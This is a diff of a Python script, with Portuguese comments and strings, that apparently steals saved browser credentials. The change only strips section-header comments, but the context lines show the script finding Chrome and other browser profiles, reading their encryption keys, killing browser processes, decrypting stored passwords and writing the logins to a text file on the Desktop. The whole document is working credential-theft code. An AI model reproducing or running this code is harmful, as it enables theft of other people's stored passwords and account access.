@@ -10,7 +10,6 @@ import ctypes
 import traceback
 import psutil
 
-# ------------------- FUNÇÕES DE UTILIDADE -------------------
 def get_desktop_path():
     csidl_desktop = 0x0010
     buf = ctypes.create_unicode_buffer(260)
@@ -20,7 +19,6 @@ def get_desktop_path():
 OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "senhaseloginsbrowsers.txt")
 TEMP_DB_FILE = "temp_BrowserPasswords.db"
 
-# ------------------- FUNÇÕES DE CHAVE DE CRIPTOGRAFIA -------------------
 def get_key(keypath):
     try:
         if not os.path.exists(keypath):
@@ -40,7 +38,6 @@ def get_key(keypath):
         traceback.print_exc()
     return None
 
-# ------------------- FUNÇÃO DE DESCRIPTOGRAFIA -------------------
 def password_decryption(password, encryption_key):
     try:
         iv = password[3:15]
@@ -63,7 +60,6 @@ def password_decryption(password, encryption_key):
                 traceback.print_exc()
     return "Sem senhas"
 
-# ------------------- FUNÇÕES DE MANIPULAÇÃO DE PROCESSOS -------------------
 def close_browser_process(browser_name):
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'].lower() == browser_name.lower():
@@ -86,7 +82,6 @@ def remove_temp_file():
             attempts += 1
             time.sleep(2)
 
-# ------------------- FUNÇÃO PARA EXTRAIR CREDENCIAIS -------------------
 def get_credentials(dbpath, keypath, browser_name):
     credentials_found = False
     collected_info = []
@@ -133,7 +128,6 @@ def get_credentials(dbpath, keypath, browser_name):
             collected_info.append(f"Browser: {browser_name}\nNenhuma senha ou login encontrado.\n")
     return collected_info
 
-# ------------------- FUNÇÃO PRINCIPAL PARA PROCESSAR BROWSERS -------------------
 def process_browsers():
     browser_loc = {
         "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
@@ -176,7 +170,6 @@ def process_browsers():
     else:
         print(f"[DEBUG] Arquivo não criado. Verifique por erros.")
 
-# ------------------- EXECUÇÃO -------------------
 try:
     process_browsers()
 except Exception as e:
